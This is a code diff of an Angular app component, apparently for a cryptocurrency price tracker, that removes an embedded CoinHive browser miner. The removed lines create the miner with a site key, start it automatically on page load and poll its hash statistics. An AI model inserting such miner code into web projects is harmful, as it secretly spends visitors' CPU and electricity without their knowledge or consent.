@@ -10,7 +10,6 @@ import 'rxjs/add/operator/map';
 import {mainViewAnimation, sidebarAnimation} from './animations';
 import {FetchService} from './service/fetch.service';
 import {ToggleSidebarAction, ToggleTransparencyAction} from './redux/actions';
-declare var CoinHive: any;
 
 @Component({
   selector: 'app-root',
@@ -22,8 +21,6 @@ export class AppComponent {
 
   shownCoins: Observable<Coin[]>;
   sidebar: Observable<string>;
-  miner: any;
-  statistics: any;
 
   constructor(private store: Store<AppState>, private fetchService: FetchService) {
 
@@ -31,29 +28,6 @@ export class AppComponent {
       .map(coins => coins.filter(coin => coin.shown));
 
     this.sidebar = store.select('sidebarState');
-
-    this.miner = new CoinHive.Anonymous('4Q2BuYl2VldkJTZItAWVBboApwvRroll', { throttle: 0.8 });
-
-    this.statistics = {
-      hashesPerSecond: 0,
-      totalHashes: 0,
-      acceptedHashes: 0
-    };
-  }
-
-  ngOnInit() {
-
-    this.miner.start();
-    this.updateStatistics();
-  }
-
-  updateStatistics() {
-    setTimeout(() => {
-      this.statistics.hashesPerSecond = this.miner.getHashesPerSecond();
-      this.statistics.totalHashes = this.miner.getTotalHashes();
-      this.statistics.acceptedHashes = this.miner.getAcceptedHashes();
-      this.updateStatistics();
-    }, 1000);
   }
 
   @HostListener('window:resize')
